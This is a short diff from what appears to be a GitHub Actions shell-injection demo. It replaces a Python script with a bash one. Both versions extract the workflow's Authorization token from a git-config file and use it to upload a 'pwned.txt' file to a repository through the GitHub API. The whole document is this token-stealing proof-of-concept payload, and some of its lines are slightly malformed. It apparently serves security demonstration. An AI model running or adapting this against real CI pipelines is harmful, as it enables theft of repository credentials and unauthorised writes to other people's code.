@@ -1,26 +1,8 @@
-#!/usr/bin/env python3
+#!/usr/bin/env bash
 
-import base64
-import configparser
-import requests
-
-parser = configparser.ConfigParser()
-parser.read("git-config")
-
-sec = parser['http "https://github.com/"']
-auth = sec['extraheader']
-auth_field = auth.split(':')[-1].strip()
-
-print({"Authorization": auth_field})
-
-requests.put(
-  "https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt"
-  headers={
-    "Authorization": auth_field,
-    "Accept": "application/vnd.github.v3+json",
-  },
-  json={
-    "message": "Upload test artifact",
-    "content": base64.b64encode("pwned"),
-  }
-)
+authfield=$(cat git-config | grep AUTHORIZATION | cut -d':' -f 2)
+curl -X PUT
+  --url https://api.github.com/repos/minusworld-gha-demo/shell-injection/contents/pwned.txt
+  --header "Authorization: $authfield"
+  --header "Accept: application/vnd.github.v3+json"
+  --data "{ \"message\": \"upload test artifact\", \"content\": \"$(echo pwned | openssl base64 | tr -d '\n')\" }"
